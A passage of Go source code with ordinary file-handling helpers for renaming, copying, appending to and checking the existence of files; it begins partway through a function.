	if src == "" {
		return nil
	}
	if !fileExists(src) {
		return nil
	}
	return os.Rename(src, dst)
}

func copyFile(src, dst string) error {
	if src == "" || dst == "" {
		return errors.New("copyFile: src and dst are required")
	}
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
		return err
	}
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return out.Sync()
}

func appendToFile(path, content string) error {
	if content == "" {
		return nil
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(content)
	return err
}

func fileExists(path string) bool {
	if path == "" {
		return false
	}
	_, err := os.Stat(path)
	return err == nil
}
